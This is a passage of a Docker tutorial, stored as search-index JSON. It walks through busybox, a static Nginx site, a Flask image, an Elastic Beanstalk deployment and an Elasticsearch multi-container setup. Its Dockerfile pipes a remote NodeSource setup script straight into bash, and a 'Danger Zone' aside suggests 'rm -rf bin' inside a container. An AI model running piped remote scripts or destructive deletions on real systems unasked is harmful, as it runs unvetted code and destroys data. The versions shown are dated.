on these OSes, thus running Docker now is a cakewalk. The getting started guide on Docker has detailed instructions for setting up Docker on Mac, Linux and Windows.</p> <p>Once you are done installing Docker, test your Docker installation by running the following:</p> <pre><code>$ docker run hello-world\n\nHello from Docker.\nThis message shows that your installation appears to be working correctly.\n...\n</code></pre>"},{"location":"CTF/Docker/#hello-world","title":"HELLO WORLD","text":""},{"location":"CTF/Docker/#playing-with-busybox","title":"Playing with Busybox","text":"<p>Now that we have everything setup, it's time to get our hands dirty. In this section, we are going to run a Busybox container on our system and get a taste of the <code>docker run</code> command.</p> <p>To get started, let's run the following in our terminal:</p> <pre><code>$ docker pull busybox\n</code></pre> <p>Note: Depending on how you've installed docker on your system, you might see a <code>permission denied</code> error after running the above command. If you're on a Mac, make sure the Docker engine is running. If you're on Linux, then prefix your <code>docker</code> commands with <code>sudo</code>. Alternatively, you can create a docker group to get rid of this issue.</p> <p>The <code>pull</code> command fetches the busybox image from the Docker registry and saves it to our system. You can use the <code>docker images</code> command to see a list of all images on your system.</p> <pre><code>$ docker images\nREPOSITORY              TAG                 IMAGE ID            CREATED             VIRTUAL SIZE\nbusybox                 latest              c51f86c28340        4 weeks ago         1.109 MB\n</code></pre>"},{"location":"CTF/Docker/#docker-run","title":"Docker Run","text":"<p>Great! Let's now run a Docker container based on this image. To do that we are going to use the almighty <code>docker run</code> command.</p> <pre><code>$ docker run busybox\n</code></pre> <p>Wait, nothing happened! Is that a bug? Well, no. Behind the scenes, a lot of stuff happened. When you call <code>run</code>, the Docker client finds the image (busybox in this case), loads up the container and then runs a command in that container. When we run <code>docker run busybox</code>, we didn't provide a command, so the container booted up, ran an empty command and then exited. Well, yeah - kind of a bummer. Let's try something more exciting.</p> <pre><code>$ docker run busybox echo \"hello from busybox\"\nhello from busybox\n</code></pre> <p>Nice - finally we see some output. In this case, the Docker client dutifully ran the <code>echo</code> command in our busybox container and then exited it. If you've noticed, all of that happened pretty quickly. Imagine booting up a virtual machine, running a command and then killing it. Now you know why they say containers are fast! Ok, now it's time to see the <code>docker ps</code> command. The <code>docker ps</code> command shows you all containers that are currently running.</p> <pre><code>$ docker ps\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\n</code></pre> <p>Since no containers are running, we see a blank line. Let's try a more useful variant: <code>docker ps -a</code></p> <pre><code>$ docker ps -a\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                      PORTS               NAMES\n305297d7a235        busybox             \"uptime\"            11 minutes ago      Exited (0) 11 minutes ago                       distracted_goldstine\nff0a5c3750b9        busybox             \"sh\"                12 minutes ago      Exited (0) 12 minutes ago                       elated_ramanujan\n14e5bd11d164        hello-world         \"/hello\"            2 minutes ago       Exited (0) 2 minutes ago                        thirsty_euclid\n</code></pre> <p>So what we see above is a list of all containers that we ran. Do notice that the <code>STATUS</code> column shows that these containers exited a few minutes ago.</p> <p>You're probably wondering if there is a way to run more than just one command in a container. Let's try that now:</p> <pre><code>$ docker run -it busybox sh\n/ # ls\nbin   dev   etc   home  proc  root  sys   tmp   usr   var\n/ # uptime\n 05:45:21 up  5:58,  0 users,  load average: 0.00, 0.01, 0.04\n</code></pre> <p>Running the <code>run</code> command with the <code>-it</code> flags attaches us to an interactive tty in the container. Now we can run as many commands in the container as we want. Take some time to run your favorite commands.</p> <p>Danger Zone: If you're feeling particularly adventurous you can try <code>rm -rf bin</code> in the container. Make sure you run this command in the container and not in your laptop/desktop. Doing this will make any other commands like <code>ls</code>, <code>uptime</code> not work. Once everything stops working, you can exit the container (type <code>exit</code> and press Enter) and then start it up again with the <code>docker run -it busybox sh</code> command. Since Docker creates a new container every time, everything should start working again.</p> <p>That concludes a whirlwind tour of the mighty <code>docker run</code> command, which would most likely be the command you'll use most often. It makes sense to spend some time getting comfortable with it. To find out more about <code>run</code>, use <code>docker run --help</code> to see a list of all flags it supports. As we proceed further, we'll see a few more variants of <code>docker run</code>.</p> <p>Before we move ahead though, let's quickly talk about deleting containers. We saw above that we can still see remnants of the container even after we've exited by running <code>docker ps -a</code>. Throughout this tutorial, you'll run <code>docker run</code> multiple times and leaving stray containers will eat up disk space. Hence, as a rule of thumb, I clean up containers once I'm done with them. To do that, you can run the <code>docker rm</code> command. Just copy the container IDs from above and paste them alongside the command.</p> <pre><code>$ docker rm 305297d7a235 ff0a5c3750b9\n305297d7a235\nff0a5c3750b9\n</code></pre> <p>On deletion, you should see the IDs echoed back to you. If you have a bunch of containers to delete in one go, copy-pasting IDs can be tedious. In that case, you can simply run -</p> <pre><code>$ docker rm $(docker ps -a -q -f status=exited)\n</code></pre> <p>This command deletes all containers that have a status of <code>exited</code>. In case you're wondering, the <code>-q</code> flag, only returns the numeric IDs and <code>-f</code> filters output based on conditions provided. One last thing that'll be useful is the <code>--rm</code> flag that can be passed to <code>docker run</code> which automatically deletes the container once it's exited from. For one off docker runs, <code>--rm</code> flag is very useful.</p> <p>In later versions of Docker, the <code>docker container prune</code> command can be used to achieve the same effect.</p> <pre><code>$ docker container prune\nWARNING! This will remove all stopped containers.\nAre you sure you want to continue? [y/N] y\nDeleted Containers:\n4a7f7eebae0f63178aff7eb0aa39f0627a203ab2df258c1a00b456cf20063\nf98f9c2aa1eaf727e4ec9c0283bcaa4762fbdba7f26191f26c97f64090360\n\nTotal reclaimed space: 212 B\n</code></pre> <p>Lastly, you can also delete images that you no longer need by running <code>docker rmi</code>.</p>"},{"location":"CTF/Docker/#terminology","title":"Terminology","text":"<p>In the last section, we used a lot of Docker-specific jargon which might be confusing to some. So before we go further, let me clarify some terminology that is used frequently in the Docker ecosystem.</p> <ul> <li>Images - The blueprints of our application which form the basis of containers. In the demo above, we used the <code>docker pull</code> command to download the busybox image.</li> <li>Containers - Created from Docker images and run the actual application. We create a container using <code>docker run</code> which we did using the busybox image that we downloaded. A list of running containers can be seen using the <code>docker ps</code> command.</li> <li>Docker Daemon - The background service running on the host that manages building, running and distributing Docker containers. The daemon is the process that runs in the operating system which clients talk to.</li> <li>Docker Client - The command line tool that allows the user to interact with the daemon. More generally, there can be other forms of clients too - such as Kitematic which provide a GUI to the users.</li> <li>Docker Hub - A registry of Docker images. You can think of the registry as a directory of all available Docker images. If required, one can host their own Docker registries and can use them for pulling images.</li> </ul>"},{"location":"CTF/Docker/#webapps-with-docker","title":"WEBAPPS WITH DOCKER","text":"<p>Great! So we have now looked at <code>docker run</code>, played with a Docker container and also got a hang of some terminology. Armed with all this knowledge, we are now ready to get to the real-stuff, i.e. deploying web applications with Docker!</p>"},{"location":"CTF/Docker/#static-sites","title":"Static Sites","text":"<p>Let's start by taking baby-steps. The first thing we're going to look at is how we can run a dead-simple static website. We're going to pull a Docker image from Docker Hub, run the container and see how easy it is to run a webserver.</p> <p>Let's begin. The image that we are going to use is a single-page website that I've already created for the purpose of this demo and hosted on the registry - <code>prakhar1989/static-site</code>. We can download and run the image directly in one go using <code>docker run</code>. As noted above, the <code>--rm</code> flag automatically removes the container when it exits and the <code>-it</code> flag specifies an interactive terminal which makes it easier to kill the container with Ctrl+C (on windows).</p> <pre><code>$ docker run --rm -it prakhar1989/static-site\n</code></pre> <p>Since the image doesn't exist locally, the client will first fetch the image from the registry and then run the image. If all goes well, you should see a <code>Nginx is running...</code> message in your terminal. Okay now that the server is running, how to see the website? What port is it running on? And more importantly, how do we access the container directly from our host machine? Hit Ctrl+C to stop the container.</p> <p>Well, in this case, the client is not exposing any ports so we need to re-run the <code>docker run</code> command to publish ports. While we're at it, we should also find a way so that our terminal is not attached to the running container. This way, you can happily close your terminal and keep the container running. This is called detached mode.</p> <pre><code>$ docker run -d -P --name static-site prakhar1989/static-site\ne61d12292d69556eabe2a44c16cbd54486b2527e2ce4f95438e504afb7b02810\n</code></pre> <p>In the above command, <code>-d</code> will detach our terminal, <code>-P</code> will publish all exposed ports to random ports and finally <code>--name</code> corresponds to a name we want to give. Now we can see the ports by running the <code>docker port [CONTAINER]</code> command</p> <pre><code>$ docker port static-site\n80/tcp -&gt; 0.0.0.0:32769\n443/tcp -&gt; 0.0.0.0:32768\n</code></pre> <p>You can open http://localhost:32769 in your browser.</p> <p>Note: If you're using docker-toolbox, then you might need to use <code>docker-machine ip default</code> to get the IP.</p> <p>You can also specify a custom port to which the client will forward connections to the container.</p> <pre><code>$ docker run -p 8888:80 prakhar1989/static-site\nNginx is running...\n</code></pre> <p></p> <p>To stop a detached container, run <code>docker stop</code> by giving the container ID. In this case, we can use the name <code>static-site</code> we used to start the container.</p> <pre><code>$ docker stop static-site\nstatic-site\n</code></pre> <p>I'm sure you agree that was super simple. To deploy this on a real server you would just need to install Docker, and run the above Docker command. Now that you've seen how to run a webserver inside a Docker image, you must be wondering - how do I create my own Docker image? This is the question we'll be exploring in the next section.</p>"},{"location":"CTF/Docker/#docker-images","title":"Docker Images","text":"<p>We've looked at images before, but in this section we'll dive deeper into what Docker images are and build our own image! Lastly, we'll also use that image to run our application locally and finally deploy on AWS to share it with our friends! Excited? Great! Let's get started.</p> <p>Docker images are the basis of containers. In the previous example, we pulled the Busybox image from the registry and asked the Docker client to run a container based on that image. To see the list of images that are available locally, use the <code>docker images</code> command.</p> <pre><code>$ docker images\nREPOSITORY                      TAG                 IMAGE ID            CREATED             VIRTUAL SIZE\nprakhar1989/catnip              latest              c7ffb5626a50        2 hours ago         697.9 MB\nprakhar1989/static-site         latest              b270625a1631        21 hours ago        133.9 MB\npython                          3-onbuild           cf4002b2c383        5 days ago          688.8 MB\nmartin/docker-cleanup-volumes   latest              b42990daaca2        7 weeks ago         22.14 MB\nubuntu                          latest              e9ae3c220b23        7 weeks ago         187.9 MB\nbusybox                         latest              c51f86c28340        9 weeks ago         1.109 MB\nhello-world                     latest              0a6ba66e537a        11 weeks ago        960 B\n</code></pre> <p>The above gives a list of images that I've pulled from the registry, along with ones that I've created myself (we'll shortly see how). The <code>TAG</code> refers to a particular snapshot of the image and the <code>IMAGE ID</code> is the corresponding unique identifier for that image.</p> <p>For simplicity, you can think of an image akin to a git repository - images can be committed with changes and have multiple versions. If you don't provide a specific version number, the client defaults to <code>latest</code>. For example, you can pull a specific version of <code>ubuntu</code> image</p> <pre><code>$ docker pull ubuntu:18.04\n</code></pre> <p>To get a new Docker image you can either get it from a registry (such as the Docker Hub) or create your own. There are tens of thousands of images available on Docker Hub. You can also search for images directly from the command line using <code>docker search</code>.</p> <p>An important distinction to be aware of when it comes to images is the difference between base and child images.</p> <ul> <li>Base images are images that have no parent image, usually images with an OS like ubuntu, busybox or debian.</li> <li>Child images are images that build on base images and add additional functionality.</li> </ul> <p>Then there are official and user images, which can be both base and child images.</p> <ul> <li>Official images are images that are officially maintained and supported by the folks at Docker. These are typically one word long. In the list of images above, the <code>python</code>, <code>ubuntu</code>, <code>busybox</code> and <code>hello-world</code> images are official images.</li> <li>User images are images created and shared by users like you and me. They build on base images and add additional functionality. Typically, these are formatted as <code>user/image-name</code>.</li> </ul>"},{"location":"CTF/Docker/#our-first-image","title":"Our First Image","text":"<p>Now that we have a better understanding of images, it's time to create our own. Our goal in this section will be to create an image that sandboxes a simple Flask application. For the purposes of this workshop, I've already created a fun little Flask app that displays a random cat <code>.gif</code> every time it is loaded - because you know, who doesn't like cats? If you haven't already, please go ahead and clone the repository locally like so -</p> <pre><code>$ git clone https://github.com/prakhar1989/docker-curriculum.git\n$ cd docker-curriculum/flask-app\n</code></pre> <p>This should be cloned on the machine where you are running the docker commands and not inside a docker container.</p> <p>The next step now is to create an image with this web app. As mentioned above, all user images are based on a base image. Since our application is written in Python, the base image we're going to use will be Python 3.</p>"},{"location":"CTF/Docker/#dockerfile","title":"Dockerfile","text":"<p>A Dockerfile is a simple text file that contains a list of commands that the Docker client calls while creating an image. It's a simple way to automate the image creation process. The best part is that the commands you write in a Dockerfile are almost identical to their equivalent Linux commands. This means you don't really have to learn new syntax to create your own dockerfiles.</p> <p>The application directory does contain a Dockerfile but since we're doing this for the first time, we'll create one from scratch. To start, create a new blank file in our favorite text-editor and save it in the same folder as the flask app by the name of <code>Dockerfile</code>.</p> <p>We start with specifying our base image. Use the <code>FROM</code> keyword to do that -</p> <pre><code>FROM python:3.8\n</code></pre> <p>The next step usually is to write the commands of copying the files and installing the dependencies. First, we set a working directory and then copy all the files for our app.</p> <pre><code># set a directory for the app\nWORKDIR /usr/src/app\n\n# copy all the files to the container\nCOPY . .\n</code></pre> <p>Now, that we have the files, we can install the dependencies.</p> <pre><code># install dependencies\nRUN pip install --no-cache-dir -r requirements.txt\n</code></pre> <p>The next thing we need to specify is the port number that needs to be exposed. Since our flask app is running on port <code>5000</code>, that's what we'll indicate.</p> <pre><code>EXPOSE 5000\n</code></pre> <p>The last step is to write the command for running the application, which is simply - <code>python ./app.py</code>. We use the CMD command to do that -</p> <pre><code>CMD [\"python\", \"./app.py\"]\n</code></pre> <p>The primary purpose of <code>CMD</code> is to tell the container which command it should run when it is started. With that, our <code>Dockerfile</code> is now ready. This is how it looks -</p> <pre><code>FROM python:3.8\n\n# set a directory for the app\nWORKDIR /usr/src/app\n\n# copy all the files to the container\nCOPY . .\n\n# install dependencies\nRUN pip install --no-cache-dir -r requirements.txt\n\n# define the port number the container should expose\nEXPOSE 5000\n\n# run the command\nCMD [\"python\", \"./app.py\"]\n</code></pre> <p>Now that we have our <code>Dockerfile</code>, we can build our image. The <code>docker build</code> command does the heavy-lifting of creating a Docker image from a <code>Dockerfile</code>.</p> <p>The section below shows you the output of running the same. Before you run the command yourself (don't forget the period), make sure to replace my username with yours. This username should be the same one you created when you registered on Docker hub. If you haven't done that yet, please go ahead and create an account. The <code>docker build</code> command is quite simple - it takes an optional tag name with <code>-t</code> and a location of the directory containing the <code>Dockerfile</code>.</p> <pre><code>$ docker build -t yourusername/catnip .\nSending build context to Docker daemon 8.704 kB\nStep 1 : FROM python:3.8\n# Executing 3 build triggers...\nStep 1 : COPY requirements.txt /usr/src/app/\n ---&gt; Using cache\nStep 1 : RUN pip install --no-cache-dir -r requirements.txt\n ---&gt; Using cache\nStep 1 : COPY . /usr/src/app\n ---&gt; 1d61f639ef9e\nRemoving intermediate container 4de6ddf5528c\nStep 2 : EXPOSE 5000\n ---&gt; Running in 12cfcf6d67ee\n ---&gt; f423c2f179d1\nRemoving intermediate container 12cfcf6d67ee\nStep 3 : CMD python ./app.py\n ---&gt; Running in f01401a5ace9\n ---&gt; 13e87ed1fbc2\nRemoving intermediate container f01401a5ace9\nSuccessfully built 13e87ed1fbc2\n</code></pre> <p>If you don't have the <code>python:3.8</code> image, the client will first pull the image and then create your image. Hence, your output from running the command will look different from mine. If everything went well, your image should be ready! Run <code>docker images</code> and see if your image shows.</p> <p>The last step in this section is to run the image and see if it actually works (replacing my username with yours).</p> <pre><code>$ docker run -p 8888:5000 yourusername/catnip\n * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)\n</code></pre> <p>The command we just ran used port 5000 for the server inside the container and exposed this externally on port 8888. Head over to the URL with port 8888, where your app should be live.</p> <p></p> <p>Congratulations! You have successfully created your first docker image.</p>"},{"location":"CTF/Docker/#docker-on-aws","title":"Docker on AWS","text":"<p>What good is an application that can't be shared with friends, right? So in this section we are going to see how we can deploy our awesome application to the cloud so that we can share it with our friends! We're going to use AWS Elastic Beanstalk to get our application up and running in a few clicks. We'll also see how easy it is to make our application scalable and manageable with Beanstalk!</p>"},{"location":"CTF/Docker/#docker-push","title":"Docker push","text":"<p>The first thing that we need to do before we deploy our app to AWS is to publish our image on a registry which can be accessed by AWS. There are many different Docker registries you can use (you can even host your own). For now, let's use Docker Hub to publish the image.</p> <p>If this is the first time you are pushing an image, the client will ask you to login. Provide the same credentials that you used for logging into Docker Hub.</p> <pre><code>$ docker login\nLogin in with your Docker ID to push and pull images from Docker Hub. If you do not have a Docker ID, head over to https://hub.docker.com to create one.\nUsername: yourusername\nPassword:\nWARNING! Your password will be stored unencrypted in /Users/yourusername/.docker/config.json\nConfigure a credential helper to remove this warning. See\nhttps://docs.docker.com/engine/reference/commandline/login/credential-store\n\nLogin Succeeded\n</code></pre> <p>To publish, just type the below command remembering to replace the name of the image tag above with yours. It is important to have the format of <code>yourusername/image_name</code> so that the client knows where to publish.</p> <pre><code>$ docker push yourusername/catnip\n</code></pre> <p>Once that is done, you can view your image on Docker Hub. For example, here's the web page for my image.</p> <p>Note: One thing that I'd like to clarify before we go ahead is that it is not imperative to host your image on a public registry (or any registry) in order to deploy to AWS. In case you're writing code for the next million-dollar unicorn startup you can totally skip this step. The reason why we're pushing our images publicly is that it makes deployment super simple by skipping a few intermediate configuration steps.</p> <p>Now that your image is online, anyone who has docker installed can play with your app by typing just a single command.</p> <pre><code>$ docker run -p 8888:5000 yourusername/catnip\n</code></pre> <p>If you've pulled your hair out in setting up local dev environments / sharing application configuration in the past, you very well know how awesome this sounds. That's why Docker is so cool!</p>"},{"location":"CTF/Docker/#beanstalk","title":"Beanstalk","text":"<p>AWS Elastic Beanstalk (EB) is a PaaS (Platform as a Service) offered by AWS. If you've used Heroku, Google App Engine etc. you'll feel right at home. As a developer, you just tell EB how to run your app and it takes care of the rest - including scaling, monitoring and even updates. In April 2014, EB added support for running single-container Docker deployments which is what we'll use to deploy our app. Although EB has a very intuitive CLI, it does require some setup, and to keep things simple we'll use the web UI to launch our application.</p> <p>To follow along, you need a functioning AWS account. If you haven't already, please go ahead and do that now - you will need to enter your credit card information. But don't worry, it's free and anything we do in this tutorial will also be free! Let's get started.</p> <p>Here are the steps:</p> <ul> <li>Login to your AWS console.</li> <li>Click on Elastic Beanstalk. It will be in the compute section on the top left. Alternatively, you can access the Elastic Beanstalk console.</li> </ul> <p></p> <ul> <li>Click on \"Create New Application\" in the top right</li> <li>Give your app a memorable (but unique) name and provide an (optional) description</li> <li>In the New Environment screen, create a new environment and choose the Web Server Environment.</li> <li>Fill in the environment information by choosing a domain. This URL is what you'll share with your friends so make sure it's easy to remember.</li> <li>Under base configuration section. Choose Docker from the predefined platform.</li> </ul> <p></p> <ul> <li>Now we need to upload our application code. But since our application is packaged in a Docker container, we just need to tell EB about our container. Open the <code>Dockerrun.aws.json</code> file located in the <code>flask-app</code> folder and edit the <code>Name</code> of the image to your image's name. Don't worry, I'll explain the contents of the file shortly. When you are done, click on the radio button for \"Upload your Code\", choose this file, and click on \"Upload\".</li> <li>Now click on \"Create environment\". The final screen that you see will have a few spinners indicating that your environment is being set up. It typically takes around 5 minutes for the first-time setup.</li> </ul> <p>While we wait, let's quickly see what the <code>Dockerrun.aws.json</code> file contains. This file is basically an AWS specific file that tells EB details about our application and docker configuration.</p> <pre><code>{\n  \"AWSEBDockerrunVersion\": \"1\",\n  \"Image\": {\n    \"Name\": \"prakhar1989/catnip\",\n    \"Update\": \"true\"\n  },\n  \"Ports\": [\n    {\n      \"ContainerPort\": 5000,\n      \"HostPort\": 8000\n    }\n  ],\n  \"Logging\": \"/var/log/nginx\"\n}\n</code></pre> <p>The file should be pretty self-explanatory, but you can always reference the official documentation for more information. We provide the name of the image that EB should use along with a port that the container should open.</p> <p>Hopefully by now, our instance should be ready. Head over to the EB page and you should see a green tick indicating that your app is alive and kicking.</p> <p></p> <p>Go ahead and open the URL in your browser and you should see the application in all its glory. Feel free to email / IM / snapchat this link to your friends and family so that they can enjoy a few cat gifs, too.</p>"},{"location":"CTF/Docker/#cleanup","title":"Cleanup","text":"<p>Once you done basking in the glory of your app, remember to terminate the environment so that you don't end up getting charged for extra resources.</p> <p></p> <p>Congratulations! You have deployed your first Docker application! That might seem like a lot of steps, but with the command-line tool for EB you can almost mimic the functionality of Heroku in a few keystrokes! Hopefully, you agree that Docker takes away a lot of the pains of building and deploying applications in the cloud. I would encourage you to read the AWS documentation on single-container Docker environments to get an idea of what features exist.</p> <p>In the next (and final) part of the tutorial, we'll up the ante a bit and deploy an application that mimics the real-world more closely; an app with a persistent back-end storage tier. Let's get straight to it!</p>"},{"location":"CTF/Docker/#multi-container-environments","title":"MULTI-CONTAINER ENVIRONMENTS","text":"<p>In the last section, we saw how easy and fun it is to run applications with Docker. We started with a simple static website and then tried a Flask app. Both of which we could run locally and in the cloud with just a few commands. One thing both these apps had in common was that they were running in a single container.</p> <p>Those of you who have experience running services in production know that usually apps nowadays are not that simple. There's almost always a database (or any other kind of persistent storage) involved. Systems such as Redis and Memcached have become de rigueur of most web application architectures. Hence, in this section we are going to spend some time learning how to Dockerize applications which rely on different services to run.</p> <p>In particular, we are going to see how we can run and manage multi-container docker environments. Why multi-container you might ask? Well, one of the key points of Docker is the way it provides isolation. The idea of bundling a process with its dependencies in a sandbox (called containers) is what makes this so powerful.</p> <p>Just like it's a good strategy to decouple your application tiers, it is wise to keep containers for each of the services separate. Each tier is likely to have different resource needs and those needs might grow at different rates. By separating the tiers into different containers, we can compose each tier using the most appropriate instance type based on different resource needs. This also plays in very well with the whole microservices movement which is one of the main reasons why Docker (or any other container technology) is at the forefront of modern microservices architectures.</p>"},{"location":"CTF/Docker/#sf-food-trucks","title":"SF Food Trucks","text":"<p>The app that we're going to Dockerize is called SF Food Trucks. My goal in building this app was to have something that is useful (in that it resembles a real-world application), relies on at least one service, but is not too complex for the purpose of this tutorial. This is what I came up with.</p> <p></p> <p>The app's backend is written in Python (Flask) and for search it uses Elasticsearch. Like everything else in this tutorial, the entire source is available on Github. We'll use this as our candidate application for learning out how to build, run and deploy a multi-container environment.</p> <p>First up, let's clone the repository locally.</p> <pre><code>$ git clone https://github.com/prakhar1989/FoodTrucks\n$ cd FoodTrucks\n$ tree -L 2\n.\n\u251c\u2500\u2500 Dockerfile\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 aws-compose.yml\n\u251c\u2500\u2500 docker-compose.yml\n\u251c\u2500\u2500 flask-app\n\u2502   \u251c\u2500\u2500 app.py\n\u2502   \u251c\u2500\u2500 package-lock.json\n\u2502   \u251c\u2500\u2500 package.json\n\u2502   \u251c\u2500\u2500 requirements.txt\n\u2502   \u251c\u2500\u2500 static\n\u2502   \u251c\u2500\u2500 templates\n\u2502   \u2514\u2500\u2500 webpack.config.js\n\u251c\u2500\u2500 setup-aws-ecs.sh\n\u251c\u2500\u2500 setup-docker.sh\n\u251c\u2500\u2500 shot.png\n\u2514\u2500\u2500 utils\n    \u251c\u2500\u2500 generate_geojson.py\n    \u2514\u2500\u2500 trucks.geojson\n</code></pre> <p>The <code>flask-app</code> folder contains the Python application, while the <code>utils</code> folder has some utilities to load the data into Elasticsearch. The directory also contains some YAML files and a Dockerfile, all of which we'll see in greater detail as we progress through this tutorial. If you are curious, feel free to take a look at the files.</p> <p>Now that you're excited (hopefully), let's think of how we can Dockerize the app. We can see that the application consists of a Flask backend server and an Elasticsearch service. A natural way to split this app would be to have two containers - one running the Flask process and another running the Elasticsearch (ES) process. That way if our app becomes popular, we can scale it by adding more containers depending on where the bottleneck lies.</p> <p>Great, so we need two containers. That shouldn't be hard right? We've already built our own Flask container in the previous section. And for Elasticsearch, let's see if we can find something on the hub.</p> <pre><code>$ docker search elasticsearch\nNAME                              DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED\nelasticsearch                     Elasticsearch is a powerful open source se...   697       [OK]\nitzg/elasticsearch                Provides an easily configurable Elasticsea...   17                   [OK]\ntutum/elasticsearch               Elasticsearch image - listens in port 9200.     15                   [OK]\nbarnybug/elasticsearch            Latest Elasticsearch 1.7.2 and previous re...   15                   [OK]\ndigitalwonderland/elasticsearch   Latest Elasticsearch with Marvel &amp; Kibana       12                   [OK]\nmonsantoco/elasticsearch          ElasticSearch Docker image                      9                    [OK]\n</code></pre> <p>Quite unsurprisingly, there exists an officially supported image for Elasticsearch. To get ES running, we can simply use <code>docker run</code> and have a single-node ES container running locally within no time.</p> <p>Note: Elastic, the company behind Elasticsearch, maintains its own registry for Elastic products. It's recommended to use the images from that registry if you plan to use Elasticsearch.</p> <p>Let's first pull the image</p> <pre><code>$ docker pull docker.elastic.co/elasticsearch/elasticsearch:6.3.2\n</code></pre> <p>and then run it in development mode by specifying ports and setting an environment variable that configures the Elasticsearch cluster to run as a single-node.</p> <pre><code>$ docker run -d --name es -p 9200:9200 -p 9300:9300 -e \"discovery.type=single-node\" docker.elastic.co/elasticsearch/elasticsearch:6.3.2\n277451c15ec183dd939e80298ea4bcf55050328a39b04124b387d668e3ed3943\n</code></pre> <p>Note: If your container runs into memory issues, you might need to tweak some JVM flags to limit its memory consumption.</p> <p>As seen above, we use <code>--name es</code> to give our container a name which makes it easy to use in subsequent commands. Once the container is started, we can see the logs by running <code>docker container logs</code> with the container name (or ID) to inspect the logs. You should see logs similar to below if Elasticsearch started successfully.</p> <p>Note: Elasticsearch takes a few seconds to start so you might need to wait before you see <code>initialized</code> in the logs.</p> <pre><code>$ docker container ls\nCONTAINER ID        IMAGE                                                 COMMAND                  CREATED             STATUS              PORTS                                            NAMES\n277451c15ec1        docker.elastic.co/elasticsearch/elasticsearch:6.3.2   \"/usr/local/bin/dock\u2026\"   2 minutes ago       Up 2 minutes        0.0.0.0:9200-&gt;9200/tcp, 0.0.0.0:9300-&gt;9300/tcp   es\n\n$ docker container logs es\n[2018-07-29T05:49:09,304][INFO ][o.e.n.Node               ] [] initializing ...\n[2018-07-29T05:49:09,385][INFO ][o.e.e.NodeEnvironment    ] [L1VMyzt] using [1] data paths, mounts [[/ (overlay)]], net usable_space [54.1gb], net total_space [62.7gb], types [overlay]\n[2018-07-29T05:49:09,385][INFO ][o.e.e.NodeEnvironment    ] [L1VMyzt] heap size [990.7mb], compressed ordinary object pointers [true]\n[2018-07-29T05:49:11,979][INFO ][o.e.p.PluginsService     ] [L1VMyzt] loaded module [x-pack-security]\n[2018-07-29T05:49:11,980][INFO ][o.e.p.PluginsService     ] [L1VMyzt] loaded module [x-pack-sql]\n[2018-07-29T05:49:11,980][INFO ][o.e.p.PluginsService     ] [L1VMyzt] loaded module [x-pack-upgrade]\n[2018-07-29T05:49:11,980][INFO ][o.e.p.PluginsService     ] [L1VMyzt] loaded module [x-pack-watcher]\n[2018-07-29T05:49:11,981][INFO ][o.e.p.PluginsService     ] [L1VMyzt] loaded plugin [ingest-geoip]\n[2018-07-29T05:49:11,981][INFO ][o.e.p.PluginsService     ] [L1VMyzt] loaded plugin [ingest-user-agent]\n[2018-07-29T05:49:17,659][INFO ][o.e.d.DiscoveryModule    ] [L1VMyzt] using discovery type [single-node]\n[2018-07-29T05:49:18,962][INFO ][o.e.n.Node               ] [L1VMyzt] initialized\n[2018-07-29T05:49:18,963][INFO ][o.e.n.Node               ] [L1VMyzt] starting ...\n[2018-07-29T05:49:19,218][INFO ][o.e.t.TransportService   ] [L1VMyzt] publish_address {172.17.0.2:9300}, bound_addresses {0.0.0.0:9300}\n[2018-07-29T05:49:19,302][INFO ][o.e.x.s.t.n.SecurityNetty4HttpServerTransport] [L1VMyzt] publish_address {172.17.0.2:9200}, bound_addresses {0.0.0.0:9200}\n[2018-07-29T05:49:19,303][INFO ][o.e.n.Node               ] [L1VMyzt] started\n[2018-07-29T05:49:19,439][WARN ][o.e.x.s.a.s.m.NativeRoleMappingStore] [L1VMyzt] Failed to clear cache for realms [[]]\n[2018-07-29T05:49:19,542][INFO ][o.e.g.GatewayService     ] [L1VMyzt] recovered [0] indices into cluster_state\n</code></pre> <p>Now, lets try to see if can send a request to the Elasticsearch container. We use the <code>9200</code> port to send a <code>cURL</code> request to the container.</p> <pre><code>$ curl 0.0.0.0:9200\n{\n  \"name\" : \"ijJDAOm\",\n  \"cluster_name\" : \"docker-cluster\",\n  \"cluster_uuid\" : \"a_nSV3XmTCqpzYYzb-LhNw\",\n  \"version\" : {\n    \"number\" : \"6.3.2\",\n    \"build_flavor\" : \"default\",\n    \"build_type\" : \"tar\",\n    \"build_hash\" : \"053779d\",\n    \"build_date\" : \"2018-07-20T05:20:23.451332Z\",\n    \"build_snapshot\" : false,\n    \"lucene_version\" : \"7.3.1\",\n    \"minimum_wire_compatibility_version\" : \"5.6.0\",\n    \"minimum_index_compatibility_version\" : \"5.0.0\"\n  },\n  \"tagline\" : \"You Know, for Search\"\n}\n</code></pre> <p>Sweet! It's looking good! While we are at it, let's get our Flask container running too. But before we get to that, we need a <code>Dockerfile</code>. In the last section, we used <code>python:3.8</code> image as our base image. This time, however, apart from installing Python dependencies via <code>pip</code>, we want our application to also generate our minified Javascript file for production. For this, we'll require Nodejs. Since we need a custom build step, we'll start from the <code>ubuntu</code> base image to build our <code>Dockerfile</code> from scratch.</p> <p>Note: if you find that an existing image doesn't cater to your needs, feel free to start from another base image and tweak it yourself. For most of the images on Docker Hub, you should be able to find the corresponding <code>Dockerfile</code> on Github. Reading through existing Dockerfiles is one of the best ways to learn how to roll your own.</p> <p>Our Dockerfile for the flask app looks like below -</p> <pre><code># start from base\nFROM ubuntu:18.04\n\nMAINTAINER Prakhar Srivastav &lt;prakhar@prakhar.me&gt;\n\n# install system-wide deps for python and node\nRUN apt-get -yqq update\nRUN apt-get -yqq install python3-pip python3-dev curl gnupg\nRUN curl -sL https://deb.nodesource.com/setup_10.x | bash\nRUN apt-get install -yq nodejs\n\n# copy our application code\nADD flask-app /opt/flask-app\nWORKDIR /opt/flask-app\n\n# fetch app specific deps\nRUN npm install\nRUN npm run build\nRUN pip3 install -r requirements.txt\n\n# expose port\nEXPOSE 5000\n\n# start app\nCMD [ \"python3\", \"./app.py\" ]\n</code></pre> <p>Quite a few new things here so let's quickly go over this file. We start off with the Ubuntu LTS base image and use the package manager <code>apt-get</code> to install the dependencies namely - Python and Node. The <code>yqq</code> flag is used to suppress output and assumes \"Yes\" to all prompts.</p> <p>We then use the <code>ADD</code> command to copy our application into a new volume in the container - <code>/opt/flask-app</code>. This is where our code will reside. We also set this as our working directory, so that the following commands will be run in the context of this location. Now that our system-wide dependencies are installed, we get around to installing app-specific 